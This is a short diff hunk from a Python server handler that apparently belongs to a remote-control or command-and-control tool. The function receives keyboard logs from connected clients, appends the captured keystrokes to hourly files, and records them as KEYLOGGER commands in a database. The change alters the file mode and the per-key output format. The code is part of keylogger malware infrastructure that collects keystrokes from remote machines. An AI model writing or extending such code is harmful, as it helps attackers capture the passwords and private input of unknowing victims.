@@ -403,9 +403,9 @@ def handle_keyboard(data):
         os.makedirs(keylogger_dir, exist_ok=True)
         file_name = f"{datetime.now().strftime('%Y-%m-%d_%H')}.txt"
         keylogger_path = f"{keylogger_dir}/{file_name}"
-        with open(keylogger_path, 'w', encoding='utf-8') as f:
-            for key in data.get('keyboard_log', []):
-                f.write(f"{key[0]} - {key[1]}\n")
+        with open(keylogger_path, 'a', encoding='utf-8') as f:
+            for key in data.get('keyboard_log'):
+                f.write(f"{key}\n")
         new_command = Command(type=CommandType.KEYLOGGER, client_id=client.id, file_path=keylogger_path)
         if db.session.query(Command).filter_by(file_path=keylogger_path).count() > 0:
             update_command = Command.query.filter_by(file_path=keylogger_path).first()
